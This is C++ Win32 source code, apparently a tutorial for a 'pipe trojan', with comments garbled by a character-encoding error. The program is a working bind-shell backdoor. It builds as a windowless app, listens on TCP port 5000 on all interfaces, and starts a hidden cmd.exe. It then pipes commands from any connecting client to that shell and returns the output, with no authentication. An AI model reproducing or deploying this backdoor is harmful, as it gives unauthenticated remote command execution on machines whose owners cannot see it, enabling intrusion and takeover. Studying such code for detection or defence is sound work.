//��VC++2008ͨ��
//WIN32SDK֮˫�ܵ�ľ����ű�д����Դ�볬��ϸע��
//�ڱ���CMD ��ͨ�� telnet������
/***************************************************************************************************
* 1�� File       �� PipeTrojans.cpp
* 2�� Version    �� *.*
* 3�� Description�� �Ⲣ����һ��ľ������ֻ��һ��Զ��ִ��cmd����Ĺ���
* 4�� Author     �� RG (http://www.9cpp.com/)
* 5�� Created    �� 2013-7-23 13:13:21
* 6�� History    �� 
* 7�� Remark     �� Ŀǰ���ܲ����ƣ���Ҫ������»���
*                   1��socket�շ������������(�����ַ��ϲ����������<����Զ�������(���˳�������CMD)>���Ͽ�������������֤)
*                   2���ܵ��ɸ���˫������ܵ�
*                   3���������̻߳�������(����ѭ��)
****************************************************************************************************/
#include <stdio.h>

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include<stdlib.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
#include "TraceUtil.h"
//�����׽��־��
SOCKET sListen, sClient;
//����ܵ����
//�ܵ�1
HANDLE g_hReadPipe;  //���ܵ����
HANDLE g_hWritePipe; 
//�ܵ�2
HANDLE g_hWriteFile; //д�ܵ����
HANDLE g_hReadFile;

//����Զ���������д��ܵ�2
DWORD WINAPI Thread2(LPVOID lpParam)
{
    SECURITY_ATTRIBUTES sa;
    DWORD nByteToWrite, nByteWritten;         //Ҫд����ֽ���//ʵ��д����ֽ���
    char recv_buff[1024];                     //�����������Ļ�����
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); //�ṹ��Ĵ�С
    sa.lpSecurityDescriptor = NULL;           //��ȫ������
    sa.bInheritHandle = TRUE;                 //�����ܷ��´����Ľ��̼̳�

    //�����ܵ�
	if (!CreatePipe(&g_hReadPipe,     //���ܵ����
               &g_hWritePipe,    //д�ܵ����
               &sa,              //ָ��ṹsa
               0                 //��������С
              ))
	{
		::MessageBox(NULL, "�����ܵ�2(CMDд��ܵ�)ʧ��\r\n", "Tiptop", MB_OK);
		return 0;
	}
 

    while(true)//ѭ��
    {
        Sleep(250);//��ʱ250����
		memset(recv_buff, 0, 1024);
        //����Զ��CMD����
        nByteToWrite = recv(sClient,   //�׽��־��
                            recv_buff, //������
                            1024,      //����������
                            0          //���÷�ʽ
                           );
		if (-1 == nByteToWrite)
		{
			continue;
		}
		//RG::TRACE("<--����Զ��CMD��������:%s ����:%d!!!", recv_buff, nByteToWrite);
		RG::TRACE("<--:%s\r\n", recv_buff);
        //д��ܵ�
        WriteFile(g_hWritePipe,    //д��ľ��
                  recv_buff,       //����������
                  nByteToWrite,    //Ҫд����ֽ���
                  &nByteWritten,   //ʵ��д����ֽ���
                  NULL
                 );
    }
    return 0;
}

//��ȡ�ܵ�1������  ��������
DWORD WINAPI Thread1(LPVOID lpParam)
{
    SECURITY_ATTRIBUTES sa;
    DWORD len;                                //����������
    char send_buff[2048];                     //���巢�����ݵĻ�����
    sa.nLength = sizeof(SECURITY_ATTRIBUTES); //�ṹ��Ĵ�С
    sa.lpSecurityDescriptor = NULL;           //��ȫ������
    sa.bInheritHandle = TRUE;                 //�����ܷ��´����Ľ��̼̳�

	memset(send_buff, 0, 2048);
    //�����ܵ�
	if (!CreatePipe(&g_hReadFile, &g_hWriteFile, &sa, 0))
	{
		::MessageBox(NULL, "�����ܵ�1(CMD��ȡ�ܵ�)ʧ��\r\n", "Tiptop", MB_OK);
		return 0;
	}

    while(true)//��ѭ��
    {
		memset(send_buff, 0, 2048);
        //��ȡ�ܵ��е�����
        ReadFile(g_hReadFile,
                 send_buff,
                 2048,
                 &len,
                 NULL
                );

		//RG::TRACE("-->��ȡ�ܵ�1�е�����:%s ����:%d!!!", send_buff, len);
		RG::TRACE("-->:%s\r\n", send_buff);
        //�ѹܵ��е����ݷ��͸�Զ������
        send(sClient, send_buff, len, 0);
    }
    return 0;
}


int main()
{
    char wMessage[255] = "---------------��ӭ����CMD-------------\r\n";
    HANDLE  hThread[2];                //���������߳�
    DWORD dwThreadidA, dwThreadidB;    //���������߳�ID
    PROCESS_INFORMATION pi;            //���������Ϣ�ṹ&pi
    STARTUPINFO si;                    //�����½��̵���Ϣ�ṹ&si
    //��ʼ��socket,���󶨱��ض˿�
    BYTE minorVer = 2; //��λ
    BYTE majorVer = 2; //��λ
    //��ʼ��WSA
    WSADATA wsData;//����WinSock�İ汾��Ϣ
    WORD SockVersion = MAKEWORD(minorVer, majorVer);
    if(WSAStartup(SockVersion, &wsData) != 0) //ʧ�ܷ���0
        return 0;
    //�����׽���
    sListen = socket(AF_INET,      //��ַ��ʽֻ��Ϊ��
                     SOCK_STREAM,  //���׽��֣�ʹ��TCP����
                     IPPROTO_TCP   //Э������  TCPͨ��
                    );

    //�������ص�ַ���׽���
    sockaddr_in sin;                              //����ṹ
    sin.sin_family = AF_INET;                     //���������ΪAF_INET
    sin.sin_port = htons(5000);                   //ָ��TCPͨ�ŷ���˿�
    sin.sin_addr.S_un.S_addr = INADDR_ANY;        //���п��õĵ�ַ
    bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)); //��

    //����listen �������״̬
    listen(sListen,  //�׽��־��
           2         //���������
          );

    //����һ������
    sClient = accept( sListen, //�׽��־��
                      NULL,  //ָ��sockaddr�ṹָ�룬������ſͻ��˵ĵ�ַ��Ϣ
                      NULL  //ָ��sockaddr�ṹ����
                    );

    //���������߳�  ���ڶ�ȡ�ܵ�������
    hThread[0] = CreateThread(NULL,           //ָ�����̰߳�ȫ����
                              NULL,           //�����������ֽ�����ʾ���̶߳�ջ��С
                              Thread1,        //�̺߳�����ַ
                              NULL,           //���ݸ��̺߳����Ĳ���
                              0,              //��ʾ����ִ�е�ǰ�������߳�
                              &dwThreadidA    //�������̵߳�ID
                             );
    hThread[1] = CreateThread(NULL, NULL, Thread2, NULL, 0, &dwThreadidB);
    //��ͣ1��  ��֤�����̴߳������
    Sleep(1000);

    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //ʹCMD������͹ܵ�����
    si.hStdInput = g_hReadPipe;   //��ȡ
	si.hStdError = g_hWriteFile;
    si.hStdOutput = g_hWriteFile; //д��
    si.wShowWindow = SW_HIDE;   //��������
    char cmdline[256] = {0};    //��ʼ��·��
	si.cb = sizeof(STARTUPINFO);

	//�õ�ϵͳ·��
    GetSystemDirectory(cmdline, sizeof(cmdline));
    strcat(cmdline, "\\cmd.exe");

    //��������
    if(CreateProcess( cmdline,  //ָ������˿�ִ���ļ���   ·��
                      NULL,     //ָ���������ַ��������ڴ��ݿ�ִ���ļ�����  NULL
                      NULL ,    //���̵İ�ȫ���ԣ�NULL
                      NULL ,    //���̳�ʼ�̣߳����̣߳��İ�ȫ���ԣ�NULL��
                      TRUE,     //�ӽ����Ƿ���Լ̳з���̾��TRUE
                      0,        //�������̵����ȼ��ͽ������0
                      NULL,     //ָ�򻷾������飬������������Ա��ӽ��̼̳�NULL
                      NULL,     //ָ���ʾ��ǰĿ¼���ַ�������ǰĿ¼���Լ̳�NULL
                      &si,      //ָ��StartupInfo�ṹ            &si
                      &pi       //ָ��PROCESS_INFORMATION         &pi
                    ) == 0)
    {
        printf("��������ʧ��\n");
		MessageBox(NULL,"Create Process Error!!!", "", MB_OK);
        return 0;
    }

    //����һ����ӭ��Ϣ
    send(sClient, wMessage, strlen(wMessage), 0);
	RG::TRACE("����һ����ӭ��Ϣ��%s!!!\r\n", wMessage);
    //�ȴ��߳̽���
    WaitForMultipleObjects(2,          //ָ�������Ķ�����ָ�������
                           hThread,    //�����������ָ��
                           true,       //ָ���ȴ����͡������ʵ���ú������ص�״̬ʱ
                           INFINITE    //���޵ȴ�����
                          );

    return 0;

}